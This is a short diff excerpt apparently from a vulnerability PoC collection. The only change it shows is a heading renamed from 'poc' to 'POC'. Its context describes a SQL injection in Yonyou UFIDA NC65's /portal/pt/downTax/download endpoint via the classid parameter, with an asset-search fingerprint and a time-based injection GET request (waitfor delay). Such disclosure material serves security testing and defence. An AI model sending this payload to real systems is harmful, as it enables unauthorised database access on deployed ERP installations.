@@ -8,7 +8,7 @@ NC65系统可利用/portal/pt/downTax/download接口中的classid参数进行sql
 app="用友-UFIDA-NC"
 ```
 
-## poc
+## POC
 
 ```
 GET /portal/pt/downTax/download?pageId=login&classid=1'waitfor+delay+'0:0:5'-- HTTP/1.1
